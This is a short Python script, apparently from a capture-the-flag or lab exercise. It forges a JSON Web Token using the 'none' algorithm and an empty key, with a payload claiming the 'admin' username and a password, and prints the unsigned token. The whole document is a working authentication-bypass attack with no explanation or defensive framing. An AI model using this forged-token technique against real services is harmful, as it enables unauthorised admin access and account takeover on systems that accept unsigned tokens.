import jwt
token = jwt.encode(
{
  "secretid": [],
  "username": "admin",
  "password": "123",
  "iat": 1673955090
},
algorithm="none",key=""
)

print(token)